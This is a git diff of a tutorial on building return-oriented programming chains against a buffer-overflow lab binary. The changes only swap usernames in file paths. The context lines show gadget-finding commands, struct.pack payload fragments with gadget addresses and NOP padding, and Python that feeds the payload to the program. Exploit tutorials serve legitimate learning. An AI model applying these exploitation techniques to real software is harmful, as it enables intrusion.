@@ -79,7 +79,7 @@ In order to do this, we need to contruct ROP chains that locate those values and
 **Ropper (`ropper -f [vulnerable.exe]`)**
 
 ```bat
-C:\Users\robbi\Documents\GitHub\elevationstation_local>ropper -f overflow3.exe >> ropradgets.txt
+C:\Users\g3tsyst3m\Documents\GitHub\elevationstation_local>ropper -f overflow3.exe >> ropradgets.txt
 [INFO] Load gadgets for section: .text
 [LOAD] loading... 100%
 [LOAD] removing double gadgets... 100%
@@ -88,7 +88,7 @@ C:\Users\robbi\Documents\GitHub\elevationstation_local>ropper -f overflow3.exe >
 **RopGadget (`py ropgadget --binary [vulnerable.exe]`)**
 
 ```bat
-C:\Users\robbi\Desktop\ROPgadget-7.5>py ROPgadget.py --binary c:\users\robbi\Documents\GitHub\elevationstation_local\overflow3.exe >> ropgadgets2.txt
+C:\Users\g3tsyst3m\Desktop\ROPgadget-7.5>py ROPgadget.py --binary c:\users\g3tsyst3m\Documents\GitHub\elevationstation_local\overflow3.exe >> ropgadgets2.txt
 ```
 
 Let's open up both of those .txt files and we're going to look for instructions we can use to set the easiest register 1st, the `RCX` register.  Here's an instruction I found that fits the bill nicely:
@@ -115,7 +115,7 @@ payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret;
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
@@ -203,7 +203,7 @@ payload += struct.pack("<Q", 0x140006995)  # add edx, eax; mov eax, edx; ret;
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
@@ -335,7 +335,7 @@ payload += struct.pack("<Q", 0x140002410)  # 0000000140002410
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
@@ -430,7 +430,7 @@ payload += b"\x90" * 32
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
@@ -525,7 +525,7 @@ payload += struct.pack("<Q", 0x140001fb3)  # jmp qword ptr [rax];
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
